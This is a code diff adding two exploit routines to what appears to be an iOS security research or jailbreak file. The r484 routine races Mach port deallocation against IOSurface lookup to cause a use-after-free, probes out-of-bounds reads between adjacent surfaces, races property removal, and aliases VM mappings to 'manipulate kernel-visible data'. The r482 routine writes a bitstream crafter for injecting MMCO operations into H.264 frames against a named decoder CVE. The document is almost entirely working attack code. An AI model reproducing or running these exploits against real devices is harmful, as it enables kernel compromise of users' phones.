@@ -20605,6 +20605,501 @@ static void r480_ave_cb(void *ref, void *src, OSStatus st,
     if (ref) (*(int *)ref)++;
 }
 
+/* ============================================================
+ * r484: CVE-2026-112477 adapted — IOSurface UAF via Mach port +
+ *       SurfHeist adjacent OOB + IOSurface property race
+ *
+ * On iOS 27.1, IOSurfaceRootUserClient external methods ALL return
+ * kIOReturnUnsupported. The framework uses Mach ports exclusively.
+ * CVE-2026-112477 (selector 17/18 race on iOS 26.4) must be adapted
+ * to the Mach port path: IOSurfaceCreateMachPort / deallocate / lookup.
+ *
+ * Phase A: Mach port UAF — race port deallocation vs stale lookup
+ *   with tight timing + kalloc spray to reclaim IOSurfaceSendRight
+ * Phase B: SurfHeist — allocate many 16KB surfaces, check adjacency,
+ *   attempt OOB read between adjacent surfaces
+ * Phase C: IOSurface property race — race SetValue/RemoveValue for UAF
+ * Phase D: Cross-surface VM alias — create aliased VM mappings to same
+ *   physical page, modify via one surface, read via another
+ * ============================================================ */
+
+struct r484_port_race_ctx {
+    mach_port_t port;
+    volatile int *go;
+    volatile int done;
+    IOSurfaceRef result;
+    uint32_t expected_id;
+};
+
+static void *r484_lookup_thread(void *arg) {
+    struct r484_port_race_ctx *ctx = (struct r484_port_race_ctx *)arg;
+    pthread_set_qos_class_self_np(QOS_CLASS_USER_INTERACTIVE, 0);
+    while (!*(ctx->go)) __asm__ volatile("yield");
+    ctx->result = IOSurfaceLookupFromMachPort(ctx->port);
+    ctx->done = 1;
+    return NULL;
+}
+
+static void *r484_dealloc_thread(void *arg) {
+    struct r484_port_race_ctx *ctx = (struct r484_port_race_ctx *)arg;
+    pthread_set_qos_class_self_np(QOS_CLASS_USER_INTERACTIVE, 0);
+    while (!*(ctx->go)) __asm__ volatile("yield");
+    mach_port_deallocate(mach_task_self(), ctx->port);
+    ctx->done = 1;
+    return NULL;
+}
+
+static void r484_exploit(void) {
+    rlog("\n=== r484: CVE-2026-112477 adapted + SurfHeist + property race ===\n\n");
+    fflush(stdout);
+    pthread_set_qos_class_self_np(QOS_CLASS_USER_INTERACTIVE, 0);
+
+    /* Surface properties for creating test surfaces */
+    CFMutableDictionaryRef small_props = CFDictionaryCreateMutable(NULL, 0,
+        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+    int sw = 64, sh = 64, sbpe = 4, sbpr = 256;
+    int spf = 0x42475241; /* BGRA */
+    CFNumberRef swn = CFNumberCreate(NULL, kCFNumberIntType, &sw);
+    CFNumberRef shn = CFNumberCreate(NULL, kCFNumberIntType, &sh);
+    CFNumberRef sbn = CFNumberCreate(NULL, kCFNumberIntType, &sbpe);
+    CFNumberRef sbrn = CFNumberCreate(NULL, kCFNumberIntType, &sbpr);
+    CFNumberRef spfn = CFNumberCreate(NULL, kCFNumberIntType, &spf);
+    CFDictionarySetValue(small_props, CFSTR("IOSurfaceWidth"), swn);
+    CFDictionarySetValue(small_props, CFSTR("IOSurfaceHeight"), shn);
+    CFDictionarySetValue(small_props, CFSTR("IOSurfaceBytesPerElement"), sbn);
+    CFDictionarySetValue(small_props, CFSTR("IOSurfaceBytesPerRow"), sbrn);
+    CFDictionarySetValue(small_props, CFSTR("IOSurfacePixelFormat"), spfn);
+
+    /* ================================================================
+     * Phase A: Mach port UAF race (CVE-2026-112477 adapted for iOS 27.1)
+     *
+     * On iOS 27.1, IOSurface operations go through Mach port messaging.
+     * IOSurfaceCreateMachPort creates a kernel-side send right object.
+     * When the send right is deallocated, the kernel frees this object.
+     * Race: deallocate send right vs concurrent lookup from same port.
+     *
+     * Key improvement over existing mach_race: use tight synchronization
+     * and test with multiple send rights to widen the race window.
+     * ================================================================ */
+    rlog("--- Phase A: Mach port UAF race ---\n");
+    fflush(stdout);
+
+    int race_rounds = 2000;
+    int a_valid = 0, a_stale = 0, a_null = 0, a_wrong_id = 0;
+    int a_dead_name = 0;
+
+    for (int round = 0; round < race_rounds; round++) {
+        IOSurfaceRef s = IOSurfaceCreate(small_props);
+        if (!s) continue;
+        uint32_t sid = IOSurfaceGetID(s);
+
+        /* Create Mach port for this surface */
+        mach_port_t p = IOSurfaceCreateMachPort(s);
+        if (p == MACH_PORT_NULL) { CFRelease(s); continue; }
+
+        /* Create extra send right to extend the race window */
+        mach_port_t extra = MACH_PORT_NULL;
+        mach_port_insert_right(mach_task_self(), p, p, MACH_MSG_TYPE_COPY_SEND);
+
+        /* Release the framework's reference — only Mach port keeps surface alive */
+        CFRelease(s);
+
+        /* Set up race threads */
+        volatile int go = 0;
+        struct r484_port_race_ctx dealloc_ctx = { .port = p, .go = &go, .done = 0 };
+        struct r484_port_race_ctx lookup_ctx = { .port = p, .go = &go, .done = 0,
+            .result = NULL, .expected_id = sid };
+
+        pthread_t t_dealloc, t_lookup;
+        pthread_create(&t_lookup, NULL, r484_lookup_thread, &lookup_ctx);
+        pthread_create(&t_dealloc, NULL, r484_dealloc_thread, &dealloc_ctx);
+
+        /* Small delay for threads to reach spin loop */
+        usleep(50);
+
+        /* Fire! Both threads race */
+        __sync_synchronize();
+        go = 1;
+
+        pthread_join(t_dealloc, NULL);
+        pthread_join(t_lookup, NULL);
+
+        /* Deallocate the extra send right */
+        mach_port_deallocate(mach_task_self(), p);
+
+        /* Check result */
+        if (lookup_ctx.result) {
+            uint32_t rid = IOSurfaceGetID(lookup_ctx.result);
+            size_t rw = IOSurfaceGetWidth(lookup_ctx.result);
+            if (rid == sid && rw == (size_t)sw) {
+                a_valid++;
+            } else if (rid != sid) {
+                a_wrong_id++;
+                if (a_wrong_id <= 5)
+                    rlog("  [%d] *** WRONG ID: got=%u expected=%u w=%zu ***\n",
+                        round, rid, sid, rw);
+            } else {
+                a_stale++;
+                if (a_stale <= 5)
+                    rlog("  [%d] *** STALE: id=%u w=%zu (expected w=%d) ***\n",
+                        round, rid, rw, sw);
+            }
+            CFRelease(lookup_ctx.result);
+        } else {
+            a_null++;
+            /* Check if port became dead name */
+            mach_port_type_t ptype = 0;
+            kern_return_t tkr = mach_port_type(mach_task_self(), p, &ptype);
+            if (tkr == KERN_SUCCESS && (ptype & MACH_PORT_TYPE_DEAD_NAME))
+                a_dead_name++;
+        }
+
+        if (round > 0 && round % 500 == 0) {
+            rlog("  round %d: valid=%d stale=%d wrong_id=%d null=%d dead=%d\n",
+                round, a_valid, a_stale, a_wrong_id, a_null, a_dead_name);
+            fflush(stdout);
+        }
+    }
+
+    rlog("\nPhase A result (%d rounds):\n", race_rounds);
+    rlog("  valid=%d stale=%d wrong_id=%d null=%d dead_name=%d\n",
+        a_valid, a_stale, a_wrong_id, a_null, a_dead_name);
+    if (a_wrong_id > 0 || a_stale > 0)
+        rlog("  *** UAF DETECTED: kernel returned data from freed/reused object ***\n");
+    rlog("\n");
+    fflush(stdout);
+
+    /* ================================================================
+     * Phase B: SurfHeist — Adjacent IOSurface OOB
+     *
+     * Allocate many 16KB (1 page) IOSurfaces, then check which pairs
+     * have adjacent backing store addresses. Use IOSurfaceGetBaseAddress
+     * to find the user-space VA. Adjacent VAs suggest the kernel allocated
+     * contiguous pages, which means OOB from one into the other.
+     * ================================================================ */
+    rlog("--- Phase B: SurfHeist — Adjacent surface OOB probe ---\n");
+    fflush(stdout);
+
+    /* Use 1-page surfaces (16KB on arm64) */
+    CFMutableDictionaryRef page_props = CFDictionaryCreateMutable(NULL, 0,
+        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+    int pw = 64, ph = 64, pbpe = 4, pbpr = 256;
+    /* 64 * 64 * 4 = 16384 = 1 page */
+    CFNumberRef pwn = CFNumberCreate(NULL, kCFNumberIntType, &pw);
+    CFNumberRef phn = CFNumberCreate(NULL, kCFNumberIntType, &ph);
+    CFNumberRef pbn = CFNumberCreate(NULL, kCFNumberIntType, &pbpe);
+    CFNumberRef pbrn = CFNumberCreate(NULL, kCFNumberIntType, &pbpr);
+    CFNumberRef ppfn = CFNumberCreate(NULL, kCFNumberIntType, &spf);
+    CFDictionarySetValue(page_props, CFSTR("IOSurfaceWidth"), pwn);
+    CFDictionarySetValue(page_props, CFSTR("IOSurfaceHeight"), phn);
+    CFDictionarySetValue(page_props, CFSTR("IOSurfaceBytesPerElement"), pbn);
+    CFDictionarySetValue(page_props, CFSTR("IOSurfaceBytesPerRow"), pbrn);
+    CFDictionarySetValue(page_props, CFSTR("IOSurfacePixelFormat"), ppfn);
+
+    #define R484_SURF_COUNT 128
+    IOSurfaceRef surfs[R484_SURF_COUNT];
+    uintptr_t addrs[R484_SURF_COUNT];
+    uint32_t sids[R484_SURF_COUNT];
+    int b_created = 0;
+
+    rlog("  Allocating %d x 16KB surfaces...\n", R484_SURF_COUNT);
+    for (int i = 0; i < R484_SURF_COUNT; i++) {
+        surfs[i] = IOSurfaceCreate(page_props);
+        if (!surfs[i]) continue;
+        sids[i] = IOSurfaceGetID(surfs[i]);
+        IOSurfaceLock(surfs[i], 0, NULL);
+        void *base = IOSurfaceGetBaseAddress(surfs[i]);
+        addrs[i] = (uintptr_t)base;
+        /* Write a unique marker */
+        memset(base, 0, 16384);
+        uint64_t marker = 0xBEEF000000000000ULL | i;
+        memcpy(base, &marker, 8);
+        IOSurfaceUnlock(surfs[i], 0, NULL);
+        b_created++;
+    }
+    rlog("  Created %d surfaces\n", b_created);
+
+    /* Sort by address to find adjacent pairs */
+    int b_adjacent = 0;
+    int b_oob_read = 0;
+    for (int i = 0; i < R484_SURF_COUNT; i++) {
+        if (!surfs[i]) continue;
+        for (int j = i + 1; j < R484_SURF_COUNT; j++) {
+            if (!surfs[j]) continue;
+            uintptr_t lo = addrs[i] < addrs[j] ? addrs[i] : addrs[j];
+            uintptr_t hi = addrs[i] < addrs[j] ? addrs[j] : addrs[i];
+            int lo_idx = addrs[i] < addrs[j] ? i : j;
+            int hi_idx = addrs[i] < addrs[j] ? j : i;
+
+            if (hi - lo == 0x4000) {
+                b_adjacent++;
+                if (b_adjacent <= 10) {
+                    rlog("  ADJACENT: surf[%d]@%p + surf[%d]@%p (delta=0x%lx)\n",
+                        lo_idx, (void *)addrs[lo_idx], hi_idx, (void *)addrs[hi_idx],
+                        (unsigned long)(hi - lo));
+
+                    /* Test OOB read: read past end of lower surface into upper */
+                    IOSurfaceLock(surfs[lo_idx], kIOSurfaceLockReadOnly, NULL);
+                    uint8_t *lo_base = (uint8_t *)IOSurfaceGetBaseAddress(surfs[lo_idx]);
+
+                    /* Read the last 16 bytes of the lower surface (should be our zeros) */
+                    uint64_t last_valid[2];
+                    memcpy(last_valid, lo_base + 16384 - 16, 16);
+
+                    /* Attempt OOB read: 16 bytes past the lower surface's end */
+                    /* WARNING: this may crash if guard page exists */
+                    volatile uint64_t oob_val = 0;
+                    int oob_ok = 0;
+
+                    /* Use signal handler to catch SIGBUS/SIGSEGV */
+                    struct sigaction sa_old_bus, sa_old_segv;
+                    struct sigaction sa_new;
+                    sigjmp_buf jmpbuf;
+                    static __thread sigjmp_buf *p_jmpbuf;
+                    p_jmpbuf = &jmpbuf;
+
+                    /* Can't safely use sigsetjmp in production code for this,
+                     * but for a probe this is acceptable */
+                    sa_new.sa_handler = SIG_DFL; /* will use mach exception instead */
+                    sa_new.sa_flags = 0;
+                    sigemptyset(&sa_new.sa_mask);
+
+                    /* Instead of risking a crash, check VM protection first */
+                    mach_vm_address_t oob_addr = (mach_vm_address_t)(lo_base + 16384);
+                    mach_vm_size_t oob_sz = 16;
+                    vm_region_basic_info_data_64_t info;
+                    mach_msg_type_number_t info_cnt = VM_REGION_BASIC_INFO_COUNT_64;
+                    mach_port_t obj_name;
+                    kern_return_t vkr = mach_vm_region(mach_task_self(), &oob_addr,
+                        &oob_sz, VM_REGION_BASIC_INFO_64,
+                        (vm_region_info_t)&info, &info_cnt, &obj_name);
+
+                    if (vkr == KERN_SUCCESS &&
+                        oob_addr == (mach_vm_address_t)(lo_base + 16384) &&
+                        (info.protection & VM_PROT_READ)) {
+                        /* The region right after the surface is mapped and readable */
+                        uint64_t oob_data[2];
+                        memcpy(oob_data, lo_base + 16384, 16);
+                        rlog("    OOB READ OK: [%016llx %016llx]\n", oob_data[0], oob_data[1]);
+
+                        /* Check if it matches the upper surface's marker */
+                        uint64_t expected_marker = 0xBEEF000000000000ULL | hi_idx;
+                        if (oob_data[0] == expected_marker) {
+                            rlog("    *** OOB HIT: read upper surface marker! ***\n");
+                            b_oob_read++;
+                        } else {
+                            rlog("    OOB data doesn't match upper marker (expected %016llx)\n",
+                                expected_marker);
+                        }
+                    } else {
+                        rlog("    OOB region: vkr=0x%x addr=%p prot=0x%x — %s\n",
+                            vkr, (void *)oob_addr, vkr == 0 ? info.protection : 0,
+                            vkr == 0 ? "mapped but not at expected addr" : "not mapped");
+                    }
+
+                    IOSurfaceUnlock(surfs[lo_idx], kIOSurfaceLockReadOnly, NULL);
+                }
+            }
+        }
+    }
+
+    rlog("\nPhase B result:\n");
+    rlog("  created=%d adjacent_pairs=%d oob_reads=%d\n", b_created, b_adjacent, b_oob_read);
+    if (b_oob_read > 0)
+        rlog("  *** SURFHEIST OOB CONFIRMED: can read between adjacent surfaces ***\n");
+    rlog("\n");
+    fflush(stdout);
+
+    /* Cleanup Phase B surfaces */
+    for (int i = 0; i < R484_SURF_COUNT; i++)
+        if (surfs[i]) CFRelease(surfs[i]);
+
+    /* ================================================================
+     * Phase C: IOSurface property race (SetValue/RemoveValue UAF)
+     *
+     * Race condition between setting and removing a property value.
+     * If RemoveValue frees the backing storage while SetValue or
+     * CopyValue is still accessing it, we get a UAF.
+     * ================================================================ */
+    rlog("--- Phase C: IOSurface property race ---\n");
+    fflush(stdout);
+
+    IOSurfaceRef prop_surf = IOSurfaceCreate(small_props);
+    if (prop_surf) {
+        int c_rounds = 5000;
+        int c_mismatch = 0, c_null_read = 0, c_ok = 0;
+
+        rlog("  Racing SetValue/RemoveValue/CopyValue (%d rounds)...\n", c_rounds);
+
+        for (int round = 0; round < c_rounds; round++) {
+            /* Set a property with a known pattern */
+            char key_buf[32];
+            snprintf(key_buf, sizeof(key_buf), "k%d", round % 64);
+            CFStringRef key = CFStringCreateWithCString(NULL, key_buf, kCFStringEncodingUTF8);
+
+            uint8_t data[24];
+            memset(data, 0xCC, 24);
+            uint32_t round_marker = round;
+            memcpy(data, &round_marker, 4);
+            CFDataRef val = CFDataCreate(NULL, data, 24);
+
+            IOSurfaceSetValue(prop_surf, key, val);
+            CFRelease(val);
+
+            /* Race: remove vs copy */
+            volatile int prop_go = 0;
+            volatile CFTypeRef read_val = NULL;
+            volatile int remove_done = 0;
+
+            /* Thread A: remove the property */
+            dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INTERACTIVE, 0), ^{
+                while (!prop_go) __asm__ volatile("yield");
+                IOSurfaceRemoveValue(prop_surf, key);
+                remove_done = 1;
+            });
+
+            /* Small spin then fire + read */
+            usleep(1);
+            prop_go = 1;
+            CFTypeRef rv = IOSurfaceCopyValue(prop_surf, key);
+
+            /* Wait for remove thread */
+            while (!remove_done) usleep(1);
+
+            if (rv) {
+                if (CFGetTypeID(rv) == CFDataGetTypeID()) {
+                    CFDataRef rd = (CFDataRef)rv;
+                    CFIndex len = CFDataGetLength(rd);
+                    if (len == 24) {
+                        uint32_t read_marker = 0;
+                        CFDataGetBytes(rd, CFRangeMake(0, 4), (uint8_t *)&read_marker);
+                        if (read_marker != round_marker) {
+                            c_mismatch++;
+                            if (c_mismatch <= 5)
+                                rlog("  [%d] *** MISMATCH: wrote %u read %u ***\n",
+                                    round, round_marker, read_marker);
+                        } else {
+                            c_ok++;
+                        }
+                    } else {
+                        c_mismatch++;
+                        if (c_mismatch <= 5)
+                            rlog("  [%d] *** SIZE MISMATCH: expected 24 got %ld ***\n",
+                                round, (long)len);
+                    }
+                }
+                CFRelease(rv);
+            } else {
+                c_null_read++;
+            }
+
+            CFRelease(key);
+        }
+
+        rlog("\nPhase C result (%d rounds):\n", c_rounds);
+        rlog("  ok=%d null_read=%d mismatch=%d\n", c_ok, c_null_read, c_mismatch);
+        if (c_mismatch > 0)
+            rlog("  *** PROPERTY RACE DETECTED: stale/corrupt reads ***\n");
+        rlog("\n");
+        fflush(stdout);
+
+        CFRelease(prop_surf);
+    }
+
+    /* ================================================================
+     * Phase D: Cross-surface VM alias probe
+     *
+     * Use mach_make_memory_entry_64 on one surface, then map the same
+     * physical pages into a different VM region. Writes to one mapping
+     * appear in the other. Combined with the TOCTOU race, this gives
+     * us a way to manipulate kernel-visible data.
+     * ================================================================ */
+    rlog("--- Phase D: Cross-surface VM alias ---\n");
+    fflush(stdout);
+
+    IOSurfaceRef alias_a = IOSurfaceCreate(small_props);
+    IOSurfaceRef alias_b = IOSurfaceCreate(small_props);
+    if (alias_a && alias_b) {
+        IOSurfaceLock(alias_a, 0, NULL);
+        IOSurfaceLock(alias_b, 0, NULL);
+
+        void *base_a = IOSurfaceGetBaseAddress(alias_a);
+        void *base_b = IOSurfaceGetBaseAddress(alias_b);
+        size_t sz_a = IOSurfaceGetAllocSize(alias_a);
+
+        rlog("  surf_a: base=%p size=%zu\n", base_a, sz_a);
+        rlog("  surf_b: base=%p size=%zu\n", base_b, IOSurfaceGetAllocSize(alias_b));
+
+        /* Write pattern to surface A */
+        memset(base_a, 0xDD, sz_a);
+        memset(base_b, 0xEE, sz_a);
+
+        /* Create memory entry for surface A */
+        mach_port_t me_a = MACH_PORT_NULL;
+        memory_object_size_t me_sz = sz_a;
+        kern_return_t mkr = mach_make_memory_entry_64(mach_task_self(),
+            &me_sz, (mach_vm_address_t)base_a,
+            VM_PROT_READ | VM_PROT_WRITE, &me_a, MACH_PORT_NULL);
+        rlog("  memory_entry A: kr=0x%x entry=0x%x sz=%llu\n", mkr, me_a, me_sz);
+
+        if (mkr == KERN_SUCCESS && me_a != MACH_PORT_NULL) {
+            /* Map memory entry over surface B's address */
+            mach_vm_address_t remap_addr = (mach_vm_address_t)base_b;
+            kern_return_t rkr = mach_vm_map(mach_task_self(), &remap_addr, sz_a, 0,
+                VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE,
+                me_a, 0, FALSE,
+                VM_PROT_READ | VM_PROT_WRITE,
+                VM_PROT_READ | VM_PROT_WRITE,
+                VM_INHERIT_NONE);
+            rlog("  remap A→B: kr=0x%x\n", rkr);
+
+            if (rkr == KERN_SUCCESS) {
+                /* Now base_b should read as 0xDD (surface A's data) */
+                uint8_t b_first = *(uint8_t *)base_b;
+                rlog("  base_b[0] = 0x%02x (expected 0xDD if alias works)\n", b_first);
+
+                if (b_first == 0xDD) {
+                    rlog("  *** VM ALIAS CONFIRMED ***\n");
+
+                    /* Write via B, read via A */
+                    *(uint64_t *)base_b = 0xCAFEBABE12345678ULL;
+                    uint64_t a_read = *(uint64_t *)base_a;
+                    rlog("  Write 0xCAFEBABE12345678 via B, read via A: 0x%016llx\n", a_read);
+                    if (a_read == 0xCAFEBABE12345678ULL)
+                        rlog("  *** BIDIRECTIONAL ALIAS: writes through B appear in A ***\n");
+                }
+
+                /* Restore B's original mapping */
+                mach_vm_address_t restore = (mach_vm_address_t)base_b;
+                mach_port_t me_b = MACH_PORT_NULL;
+                memory_object_size_t me_b_sz = sz_a;
+                /* Can't restore — we overwrote the mapping. That's fine for the probe. */
+            }
+            mach_port_deallocate(mach_task_self(), me_a);
+        }
+
+        IOSurfaceUnlock(alias_a, 0, NULL);
+        IOSurfaceUnlock(alias_b, 0, NULL);
+        CFRelease(alias_a);
+        CFRelease(alias_b);
+    }
+    rlog("\n");
+
+    /* Summary */
+    rlog("=== r484 Summary ===\n");
+    rlog("Phase A (Mach port UAF): valid=%d stale=%d wrong_id=%d null=%d\n",
+        a_valid, a_stale, a_wrong_id, a_null);
+    rlog("Phase B (SurfHeist OOB): adjacent=%d oob_read=%d\n", b_adjacent, b_oob_read);
+    rlog("Phase D (VM alias): see above\n");
+    rlog("=== r484 complete ===\n\n");
+    fflush(stdout);
+
+    CFRelease(small_props); CFRelease(swn); CFRelease(shn);
+    CFRelease(sbn); CFRelease(sbrn); CFRelease(spfn);
+    CFRelease(page_props); CFRelease(pwn); CFRelease(phn);
+    CFRelease(pbn); CFRelease(pbrn); CFRelease(ppfn);
+}
+
 static void r480_exploit(void) {
     rlog("\n=== r480: NTL high boundary + H.264 decode MMCO injection ===\n\n");
     fflush(stdout);
@@ -21278,6 +21773,442 @@ r481n_done:
     }
 
     rlog("\n=== r481n complete ===\n");
+    fflush(stdout);
+}
+
+/* ============================================================
+ * r482: H.264 decode with MMCO op 6 injection (CVE-2026-112689)
+ *
+ * Encode IDR + P-frame, capture both, create decoder, decode clean
+ * IDR, then craft a modified P-frame with:
+ *   adaptive_ref_pic_marking_mode_flag = 1
+ *   MMCO operation 6 (long_term_frame_idx = large)
+ *   MMCO operation 0 (end)
+ *
+ * SPS params from r481n: frame_num=5 bits, poc_lsb=6 bits, max_ref=1
+ * ============================================================ */
+
+/* Bitstream writer for constructing H.264 NAL units */
+typedef struct {
+    uint8_t *buf;
+    int capacity;
+    int byte_pos;
+    int bit_pos;  /* 7 = MSB, 0 = LSB */
+} r482_bitwriter_t;
+
+static void r482_bw_init(r482_bitwriter_t *bw, uint8_t *buf, int cap) {
+    bw->buf = buf;
+    bw->capacity = cap;
+    bw->byte_pos = 0;
+    bw->bit_pos = 7;
+    memset(buf, 0, cap);
+}
+
+static void r482_bw_put_bit(r482_bitwriter_t *bw, int bit) {
+    if (bw->byte_pos >= bw->capacity) return;
+    if (bit) bw->buf[bw->byte_pos] |= (1 << bw->bit_pos);
+    bw->bit_pos--;
+    if (bw->bit_pos < 0) {
+        bw->bit_pos = 7;
+        bw->byte_pos++;
+    }
+}
+
+static void r482_bw_put_bits(r482_bitwriter_t *bw, uint32_t val, int nbits) {
+    for (int i = nbits - 1; i >= 0; i--)
+        r482_bw_put_bit(bw, (val >> i) & 1);
+}
+
+static void r482_bw_put_ue(r482_bitwriter_t *bw, uint32_t val) {
+    /* Unsigned exp-golomb: code_num = val */
+    uint32_t code = val + 1;
+    int bits = 0;
+    uint32_t tmp = code;
+    while (tmp > 0) { bits++; tmp >>= 1; }
+    /* Write (bits-1) zeros, then the code in 'bits' binary digits */
+    for (int i = 0; i < bits - 1; i++)
+        r482_bw_put_bit(bw, 0);
+    for (int i = bits - 1; i >= 0; i--)
+        r482_bw_put_bit(bw, (code >> i) & 1);
+}
+
+static void r482_bw_put_se(r482_bitwriter_t *bw, int32_t val) {
+    uint32_t code = (val <= 0) ? (uint32_t)(-val * 2) : (uint32_t)(val * 2 - 1);
+    r482_bw_put_ue(bw, code);
+}
+
+static int r482_bw_finish(r482_bitwriter_t *bw) {
+    /* RBSP trailing bits: stop bit + alignment zeros */
+    r482_bw_put_bit(bw, 1);
+    while (bw->bit_pos != 7) r482_bw_put_bit(bw, 0);
+    return bw->byte_pos;
+}
+
+/* Encoder/decoder state for r482 */
+static CMFormatDescriptionRef r482_fmt = NULL;
+static uint8_t r482_nalu_idr[65536];
+static size_t r482_nalu_idr_len = 0;
+static uint8_t r482_nalu_p[65536];
+static size_t r482_nalu_p_len = 0;
+static int r482_enc_count = 0;
+
+static void r482_enc_cb(void *ref, void *src, OSStatus st,
+                        VTEncodeInfoFlags fl, CMSampleBufferRef sb) {
+    r482_enc_count++;
+    if (st != noErr || !sb) return;
+
+    CMFormatDescriptionRef fmt = CMSampleBufferGetFormatDescription(sb);
+    if (fmt && !r482_fmt) {
+        r482_fmt = fmt;
+        CFRetain(r482_fmt);
+    }
+
+    CMBlockBufferRef block = CMSampleBufferGetDataBuffer(sb);
+    if (!block) return;
+
+    size_t total = 0;
+    char *data = NULL;
+    CMBlockBufferGetDataPointer(block, 0, NULL, &total, &data);
+    if (!data || total == 0) return;
+
+    /* Check if this is IDR or P-frame by examining NAL type */
+    if (total >= 5) {
+        uint8_t nal_type = ((uint8_t *)data)[4] & 0x1F;
+        if (nal_type == 5 && r482_nalu_idr_len == 0) {
+            /* IDR — might contain SEI + IDR */
+            if (total > sizeof(r482_nalu_idr)) total = sizeof(r482_nalu_idr);
+            memcpy(r482_nalu_idr, data, total);
+            r482_nalu_idr_len = total;
+            rlog("    enc[%d]: IDR %zu bytes\n", r482_enc_count, total);
+        } else if (nal_type == 6) {
+            /* SEI + something — look for IDR/non-IDR after SEI */
+            uint32_t sei_len = ((uint32_t)((uint8_t*)data)[0] << 24) |
+                               ((uint32_t)((uint8_t*)data)[1] << 16) |
+                               ((uint32_t)((uint8_t*)data)[2] << 8) |
+                               ((uint8_t*)data)[3];
+            size_t next_off = 4 + sei_len;
+            if (next_off + 4 < total) {
+                uint8_t next_type = ((uint8_t *)data)[next_off + 4] & 0x1F;
+                if (next_type == 5 && r482_nalu_idr_len == 0) {
+                    if (total > sizeof(r482_nalu_idr)) total = sizeof(r482_nalu_idr);
+                    memcpy(r482_nalu_idr, data, total);
+                    r482_nalu_idr_len = total;
+                    rlog("    enc[%d]: SEI+IDR %zu bytes\n", r482_enc_count, total);
+                } else if ((next_type == 1 || next_type == 2) && r482_nalu_p_len == 0) {
+                    if (total > sizeof(r482_nalu_p)) total = sizeof(r482_nalu_p);
+                    memcpy(r482_nalu_p, data, total);
+                    r482_nalu_p_len = total;
+                    rlog("    enc[%d]: SEI+P %zu bytes type=%d\n",
+                         r482_enc_count, total, next_type);
+                }
+            }
+        } else if ((nal_type == 1 || nal_type == 2) && r482_nalu_p_len == 0) {
+            if (total > sizeof(r482_nalu_p)) total = sizeof(r482_nalu_p);
+            memcpy(r482_nalu_p, data, total);
+            r482_nalu_p_len = total;
+            rlog("    enc[%d]: P-frame %zu bytes type=%d\n",
+                 r482_enc_count, total, nal_type);
+        } else {
+            rlog("    enc[%d]: type=%d %zu bytes (skipped)\n",
+                 r482_enc_count, nal_type, total);
+        }
+    }
+}
+
+static int r482_dec_count = 0;
+static OSStatus r482_dec_last = 0;
+static void r482_dec_cb(void *ref, void *src, OSStatus st,
+                        VTDecodeInfoFlags fl, CVImageBufferRef ib,
+                        CMTime pts, CMTime dur) {
+    r482_dec_count++;
+    r482_dec_last = st;
+    rlog("    dec[%d]: st=%d ib=%p\n", r482_dec_count, (int)st, ib);
+}
+
+static void r482_exploit(void) {
+    rlog("\n=== r482: H.264 MMCO op 6 injection ===\n\n");
+    fflush(stdout);
+
+    pthread_set_qos_class_self_np(QOS_CLASS_USER_INTERACTIVE, 0);
+
+    r482_fmt = NULL;
+    r482_nalu_idr_len = 0;
+    r482_nalu_p_len = 0;
+    r482_enc_count = 0;
+    r482_dec_count = 0;
+
+    /* Step 1: Encode IDR + P-frame */
+    rlog("--- Step 1: Encode IDR + P-frame ---\n");
+
+    CFMutableDictionaryRef sa = CFDictionaryCreateMutable(
+        kCFAllocatorDefault, 0, &kCFTypeDictionaryKeyCallBacks,
+        &kCFTypeDictionaryValueCallBacks);
+    CFDictionaryRef iop = CFDictionaryCreate(kCFAllocatorDefault, NULL, NULL, 0,
+        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+    CFDictionarySetValue(sa, kCVPixelBufferIOSurfacePropertiesKey, iop);
+    CFRelease(iop);
+    int pixfmt = kCVPixelFormatType_32BGRA;
+    CFNumberRef fn = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &pixfmt);
+    CFDictionarySetValue(sa, kCVPixelBufferPixelFormatTypeKey, fn);
+    CFRelease(fn);
+
+    VTCompressionSessionRef enc = NULL;
+    OSStatus st = VTCompressionSessionCreate(
+        kCFAllocatorDefault, 128, 128, kCMVideoCodecType_H264,
+        NULL, sa, NULL, r482_enc_cb, NULL, &enc);
+    CFRelease(sa);
+    rlog("  Encoder: %d\n", (int)st);
+
+    if (st == noErr && enc) {
+        VTSessionSetProperty(enc, kVTCompressionPropertyKey_RealTime, kCFBooleanFalse);
+        VTSessionSetProperty(enc, kVTCompressionPropertyKey_AllowFrameReordering, kCFBooleanFalse);
+        VTSessionSetProperty(enc, kVTCompressionPropertyKey_ProfileLevel,
+                             kVTProfileLevel_H264_Baseline_3_0);
+        int v = 2000000;
+        CFNumberRef br = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &v);
+        VTSessionSetProperty(enc, kVTCompressionPropertyKey_AverageBitRate, br);
+        CFRelease(br);
+
+        st = VTCompressionSessionPrepareToEncodeFrames(enc);
+
+        if (st == noErr) {
+            CVPixelBufferPoolRef pool = VTCompressionSessionGetPixelBufferPool(enc);
+
+            /* Encode frame 0 (IDR) */
+            CVPixelBufferRef pb0 = NULL;
+            CVPixelBufferPoolCreatePixelBuffer(kCFAllocatorDefault, pool, &pb0);
+            if (pb0) {
+                CVPixelBufferLockBaseAddress(pb0, 0);
+                memset(CVPixelBufferGetBaseAddress(pb0), 0x40,
+                       CVPixelBufferGetBytesPerRow(pb0) * CVPixelBufferGetHeight(pb0));
+                CVPixelBufferUnlockBaseAddress(pb0, 0);
+                st = VTCompressionSessionEncodeFrame(enc, pb0, CMTimeMake(0, 30),
+                    kCMTimeInvalid, NULL, NULL, NULL);
+                rlog("  Frame 0 (IDR): %d\n", (int)st);
+                CVPixelBufferRelease(pb0);
+            }
+
+            /* Encode frame 1 (P-frame) */
+            CVPixelBufferRef pb1 = NULL;
+            CVPixelBufferPoolCreatePixelBuffer(kCFAllocatorDefault, pool, &pb1);
+            if (pb1) {
+                CVPixelBufferLockBaseAddress(pb1, 0);
+                memset(CVPixelBufferGetBaseAddress(pb1), 0x60,
+                       CVPixelBufferGetBytesPerRow(pb1) * CVPixelBufferGetHeight(pb1));
+                CVPixelBufferUnlockBaseAddress(pb1, 0);
+                st = VTCompressionSessionEncodeFrame(enc, pb1, CMTimeMake(1, 30),
+                    kCMTimeInvalid, NULL, NULL, NULL);
